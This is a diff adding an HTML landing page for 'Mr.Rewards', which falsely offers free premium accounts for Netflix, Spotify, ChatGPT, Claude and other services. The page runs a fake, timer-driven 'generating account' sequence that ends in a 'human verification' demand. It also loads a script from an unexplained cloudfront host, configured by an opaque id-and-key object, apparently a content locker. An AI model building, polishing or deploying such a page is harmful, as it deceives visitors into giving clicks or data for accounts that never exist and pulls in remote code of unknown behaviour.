@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mr.Rewards - Free Premium Digital Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e, #0f3460);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Floating particles */
+        .particle {
+            position: fixed;
+            pointer-events: none;
+            opacity: 0.5;
+            animation: float 20s infinite;
+            font-size: 1.5rem;
+        }
+
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+            }
+
+            33% {
+                transform: translateY(-100px) translateX(100px) rotate(120deg);
+            }
+
+            66% {
+                transform: translateY(100px) translateX(-100px) rotate(240deg);
+            }
+        }
+
+        /* Header */
+        header {
+            padding: 20px 50px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+
+        .nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ffffff;
+            text-decoration: none;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: #ffffff;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 5px 0;
+        }
+
+        .nav-links a:hover {
+            color: #00ff88;
+        }
+
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 100px 50px 50px;
+            position: relative;
+        }
+
+        .hero-content {
+            text-align: center;
+            max-width: 800px;
+            z-index: 1;
+        }
+
+        .hero h1 {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ffffff, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero .free-badge {
+            display: inline-block;
+            background: #00ff88;
+            color: #000;
+            padding: 10px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            color: #b0b0b0;
+            margin-bottom: 40px;
+            line-height: 1.6;
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #000;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.5);
+        }
+
+        /* App Icons Grid */
+        .apps-showcase {
+            padding: 80px 50px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 50px;
+            color: #ffffff;
+        }
+
+        .apps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .app-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+            color: inherit;
+            display: block;
+        }
+
+        .app-card::before {
+            content: 'FREE';
+            position: absolute;
+            top: 10px;
+            right: -30px;
+            background: #00ff88;
+            color: #000;
+            padding: 5px 40px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            transform: rotate(45deg);
+            z-index: 1;
+        }
+
+        .app-card:hover {
+            transform: translateY(-10px) scale(1.05);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+        }
+
+        .app-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 10px;
+        }
+
+        .app-icon img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            border-radius: 15px;
+        }
+
+        .app-name {
+            font-size: 1.1rem;
+            color: #ffffff;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .app-status {
+            font-size: 0.9rem;
+            color: #00ff88;
+        }
+
+        /* Process Page Styles */
+        .process-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 10, 10, 0.98);
+            z-index: 2000;
+            overflow-y: auto;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .process-content {
+            max-width: 600px;
+            width: 90%;
+            margin: 50px auto;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            position: relative;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 2rem;
+            cursor: pointer;
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+
+        .close-btn:hover {
+            color: #ff4444;
+            transform: rotate(90deg);
+        }
+
+        .process-header {
+            margin-bottom: 40px;
+        }
+
+        .process-header h2 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .process-steps {
+            margin: 40px 0;
+        }
+
+        .step {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.5s forwards;
+        }
+
+        .step:nth-child(1) {
+            animation-delay: 1.5s;
+        }
+
+        .step:nth-child(2) {
+            animation-delay: 3.5s;
+        }
+
+        .step:nth-child(3) {
+            animation-delay: 5.5s;
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .step-number {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #000;
+            border-radius: 50%;
+            line-height: 40px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .step-text {
+            color: #b0b0b0;
+            line-height: 1.6;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            width: 0%;
+            animation: progressFill 8s forwards;
+            animation-delay: 1s;
+        }
+
+        @keyframes progressFill {
+            to {
+                width: 100%;
+            }
+        }
+
+        .final-step-message {
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+            animation-delay: 9.5s;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .success-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+            color: #00ff88;
+        }
+
+        .verify-button {
+            display: inline-block;
+            padding: 15px 50px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #000;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
+            animation-delay: 10s;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            border: none;
+        }
+
+        .verify-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.5);
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 50px;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .feature-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #00ff88;
+        }
+
+        .feature-description {
+            color: #b0b0b0;
+            line-height: 1.6;
+        }
+
+        /* How it works section */
+        .how-it-works {
+            padding: 80px 50px;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .work-step {
+            text-align: center;
+            position: relative;
+        }
+
+        .work-step-number {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #000;
+            border-radius: 50%;
+            line-height: 80px;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .work-step-title {
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            color: #ffffff;
+        }
+
+        .work-step-desc {
+            color: #b0b0b0;
+        }
+
+        /* Footer */
+        footer {
+            padding: 40px 50px;
+            background: rgba(0, 0, 0, 0.8);
+            text-align: center;
+            color: #b0b0b0;
+        }
+
+        /* Glow effect for app cards */
+        .app-card::after {
+            content: '';
+            position: absolute;
+            top: var(--mouse-y, 50%);
+            left: var(--mouse-x, 50%);
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.3) 0%, transparent 70%);
+            transform: translate(-50%, -50%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+        }
+
+        .app-card:hover::after {
+            opacity: 1;
+        }
+
+        /* Mobile menu toggle */
+        .mobile-menu-toggle {
+            display: none;
+            font-size: 1.8rem;
+            cursor: pointer;
+            color: #fff;
+            background: none;
+            border: none;
+            z-index: 1001;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            header {
+                padding: 15px 20px;
+            }
+
+            .mobile-menu-toggle {
+                display: block;
+            }
+
+            .nav-links {
+                position: fixed;
+                top: 70px; /* Height of the header */
+                left: -100%;
+                width: 100%;
+                height: calc(100vh - 70px);
+                background: rgba(10, 10, 10, 0.98);
+                flex-direction: column;
+                align-items: center;
+                padding: 50px;
+                transition: left 0.3s ease-in-out;
+            }
+
+            .nav-links.active {
+                left: 0;
+            }
+
+            .nav-links li {
+                margin-bottom: 20px;
+            }
+            
+            .nav-links a {
+                font-size: 1.5rem;
+            }
+
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .hero p {
+                font-size: 1rem;
+            }
+
+            .apps-grid {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+                gap: 20px;
+            }
+
+            .app-card {
+                padding: 20px;
+            }
+
+            .features-grid,
+            .steps-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .process-content {
+                padding: 30px 20px;
+            }
+
+            .success-icon {
+                font-size: 4rem;
+            }
+        }
+    </style>
+</head>
+<script type="text/javascript">
+
+    var tsFxa_LpF_rGFfyc={"it":4529643,"key":"c4e73"};
+
+</script>
+
+<script src="https://dlk457skl57zp.cloudfront.net/cef2539.js"></script>
+
+<body>
+    <div class="bg-animation"></div>
+
+    <div class="particle" style="top: 10%; left: 5%; animation-delay: 0s;">✨</div>
+    <div class="particle" style="top: 20%; left: 80%; animation-delay: 3s;">🌟</div>
+    <div class="particle" style="top: 60%; left: 10%; animation-delay: 5s;">💫</div>
+    <div class="particle" style="top: 80%; left: 90%; animation-delay: 7s;">⭐</div>
+    
+    <header>
+        <nav class="nav-container">
+            <a href="#home" class="logo-text">Mr.Rewards</a>
+            <ul class="nav-links" id="navLinks">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#apps">Apps</a></li>
+                <li><a href="#how">How it Works</a></li>
+                <li><a href="#features">Features</a></li>
+                <li><a href="#contact">Contact</a></li>
+            </ul>
+            <button class="mobile-menu-toggle" id="mobileMenuToggle">☰</button>
+        </nav>
+    </header>
+
+    <main>
+        <section class="hero" id="home">
+            <div class="hero-content">
+                <div class="free-badge">100% FREE ACCESS</div>
+                <h1>Get Premium Accounts For Free!</h1>
+                <p>Access your favorite streaming services, creative tools, and AI platforms without paying a single penny. Join millions who are already enjoying premium features for free!</p>
+                <a href="#apps" class="cta-button">Get Started - It's Free!</a>
+            </div>
+        </section>
+
+        <section class="apps-showcase" id="apps">
+            <h2 class="section-title">Choose Your Free Premium Account</h2>
+            <div class="apps-grid">
+                <!-- App cards now have original image URLs -->
+                <a href="#" class="app-card" onclick="showProcess('Spotify'); return false;">
+                    <div class="app-icon"><img src="https://images.seeklogo.com/logo-png/40/1/spotify-logo-png_seeklogo-408560.png" alt="Spotify Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Spotify Premium</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Netflix'); return false;">
+                    <div class="app-icon"><img src="https://static.vecteezy.com/system/resources/previews/017/396/814/non_2x/netflix-mobile-application-logo-free-png.png" alt="Netflix Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Netflix Premium</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Canva'); return false;">
+                    <div class="app-icon"><img src="https://images.seeklogo.com/logo-png/43/1/canva-logo-png_seeklogo-438258.png" alt="Canva Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Canva Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Prime Video'); return false;">
+                    <div class="app-icon"><img src="https://logos-world.net/wp-content/uploads/2021/04/Amazon-Prime-Video-Logo.jpg" alt="Prime Video Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Prime Video</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('CapCut'); return false;">
+                    <div class="app-icon"><img src="https://static.vecteezy.com/ti/vecteur-libre/p1/13948546-logo-capcut-sur-fond-blanc-transparent-gratuit-vectoriel.jpg" alt="CapCut Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">CapCut Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('ChatGPT'); return false;">
+                    <div class="app-icon"><img src="https://images.seeklogo.com/logo-png/46/1/chatgpt-logo-png_seeklogo-465219.png" alt="ChatGPT Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">ChatGPT Plus</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Claude AI'); return false;">
+                    <div class="app-icon"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTeOboCNWIF8QWZDFShhAHz3s59jpWn-Q1fGQ&s" alt="Claude AI Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Claude Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Deezer'); return false;">
+                    <div class="app-icon"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSEKxgN1HJ5UhdH1vNFYVnwWczzpwN2PyqJIw&s" alt="Deezer Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Deezer Premium</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Perplexity'); return false;">
+                    <div class="app-icon"><img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png" alt="Perplexity Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Perplexity Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Alight Motion'); return false;">
+                    <div class="app-icon"><img src="https://i.pinimg.com/474x/ff/06/1c/ff061cd2fd5220aae8679a317bf43c58.jpg" alt="Alight Motion Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Alight Motion Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Kling AI'); return false;">
+                    <div class="app-icon"><img src="https://cdn-1.webcatalog.io/catalog/kling-ai/kling-ai-icon-filled-256.png?v=1726830098972" alt="Kling AI Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Kling AI Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+                <a href="#" class="app-card" onclick="showProcess('Pixverse AI'); return false;">
+                    <div class="app-icon"><img src="https://www.fahimai.com/wp-content/uploads/2024/11/Pixverse-CTA.png" alt="Pixverse AI Logo" onerror="this.onerror=null;this.src='https://placehold.co/80x80/1a1a2e/ffffff?text=Error';"></div>
+                    <div class="app-name">Pixverse Pro</div>
+                    <div class="app-status">✓ Available Now</div>
+                </a>
+            </div>
+        </section>
+
+        <section class="how-it-works" id="how">
+            <h2 class="section-title">How It Works</h2>
+            <div class="steps-grid">
+                <div class="work-step">
+                    <div class="work-step-number">1</div>
+                    <h3 class="work-step-title">Choose App</h3>
+                    <p class="work-step-desc">Select your desired premium app from our collection</p>
+                </div>
+                <div class="work-step">
+                    <div class="work-step-number">2</div>
+                    <h3 class="work-step-title">Quick Process</h3>
+                    <p class="work-step-desc">Complete our simple verification process</p>
+                </div>
+                <div class="work-step">
+                    <div class="work-step-number">3</div>
+                    <h3 class="work-step-title">Get Access</h3>
+                    <p class="work-step-desc">Receive your free premium account instantly</p>
+                </div>
+            </div>
+        </section>
+
+        <section class="features" id="features">
+            <h2 class="section-title">Why Choose Mr.Rewards?</h2>
+            <div class="features-grid">
+                 <div class="feature-card">
+                    <div class="feature-icon">🆓</div>
+                    <h3 class="feature-title">100% Free</h3>
+                    <p class="feature-description">No hidden fees, no credit card required. Everything is completely free!</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3 class="feature-title">Instant Access</h3>
+                    <p class="feature-description">Get your premium account in less than 2 minutes. No waiting time!</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3 class="feature-title">Safe & Secure</h3>
+                    <p class="feature-description">Your privacy is our priority. All accounts are secure and protected.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🌍</div>
+                    <h3 class="feature-title">Works Worldwide</h3>
+                    <p class="feature-description">Access from anywhere in the world. No geographical restrictions!</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📱</div>
+                    <h3 class="feature-title">All Devices</h3>
+                    <p class="feature-description">Works on all devices - phones, tablets, computers, and smart TVs.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔄</div>
+                    <h3 class="feature-title">Regular Updates</h3>
+                    <p class="feature-description">We constantly add new apps and maintain all accounts active.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <div class="process-container" id="processContainer">
+        <div class="process-content">
+            <span class="close-btn" onclick="closeProcess()">×</span>
+            <div class="process-header">
+                <h2 id="processTitle">Getting Your Account...</h2>
+                <p>Please wait while we prepare your premium account</p>
+            </div>
+            <div class="process-steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <p class="step-text">Connecting to server...</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <p class="step-text">Generating premium account...</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <p class="step-text">Finalizing your access...</p>
+                </div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <div class="final-step-message">
+                <div class="success-icon">👤</div>
+                <h3 style="font-size: 2rem; margin-bottom: 10px; color: #00ff88;">Verification Required</h3>
+                <p style="color: #b0b0b0; margin-bottom: 20px;">To prevent bot abuse, please complete a quick human verification to unlock your account.</p>
+                <button class="verify-button" onclick="verifyAccount()">Verify Now</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer id="contact">
+        <p>&copy; 2025 Mr.Rewards. All rights reserved. | Contact: support@mrrewards.com</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // --- Elements ---
+            const processContainer = document.getElementById('processContainer');
+            const processTitle = document.getElementById('processTitle');
+            const header = document.querySelector('header');
+            const appCards = document.querySelectorAll('.app-card');
+            const navLinksContainer = document.getElementById('navLinks');
+            const mobileMenuToggle = document.getElementById('mobileMenuToggle');
+
+            // --- Mobile Menu Toggle ---
+            mobileMenuToggle.addEventListener('click', () => {
+                navLinksContainer.classList.toggle('active');
+                mobileMenuToggle.textContent = navLinksContainer.classList.contains('active') ? '✕' : '☰';
+            });
+
+            // Close mobile menu when a link is clicked
+            document.querySelectorAll('.nav-links a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (navLinksContainer.classList.contains('active')) {
+                        navLinksContainer.classList.remove('active');
+                        mobileMenuToggle.textContent = '☰';
+                    }
+                });
+            });
+
+
+            // --- Show Process Modal ---
+            window.showProcess = function(appName) {
+                if (!processContainer || !processTitle) return;
+
+                // **FIXED**: Used backticks for template literal string
+                processTitle.textContent = `Getting Your ${appName} Account...`;
+                processContainer.style.display = 'flex'; // Use flex to center content vertically
+
+                // Force a reflow to restart animations
+                const elementsToReset = processContainer.querySelectorAll('.step, .progress-fill, .final-step-message, .verify-button');
+                elementsToReset.forEach(el => {
+                    el.style.animation = 'none';
+                    el.offsetHeight; // Trigger reflow
+                    el.style.animation = '';
+                });
+            }
+
+            // --- Close Process Modal ---
+            window.closeProcess = function() {
+                if (processContainer) {
+                    processContainer.style.display = 'none';
+                }
+            }
+
+            // --- Verification Function ---
+            window.verifyAccount = function() {
+                // **FIXED**: Removed alert(). 
+                // You can add your verification logic/redirection here.
+                console.log('Redirecting to verification page...');
+                // Example: window.location.href = 'https://your-verification-url.com';
+            }
+
+            // --- Header background on scroll ---
+            window.addEventListener('scroll', function() {
+                if (window.scrollY > 50) {
+                    header.style.background = 'rgba(10, 10, 10, 0.95)';
+                } else {
+                    header.style.background = 'rgba(10, 10, 10, 0.8)';
+                }
+            });
+
+            // --- App Card Glow Effect ---
+            appCards.forEach(card => {
+                card.addEventListener('mousemove', function(e) {
+                    const rect = this.getBoundingClientRect();
+                    const x = e.clientX - rect.left;
+                    const y = e.clientY - rect.top;
+                    // **FIXED**: Used backticks for template literal string
+                    this.style.setProperty('--mouse-x', `${x}px`);
+                    this.style.setProperty('--mouse-y', `${y}px`);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
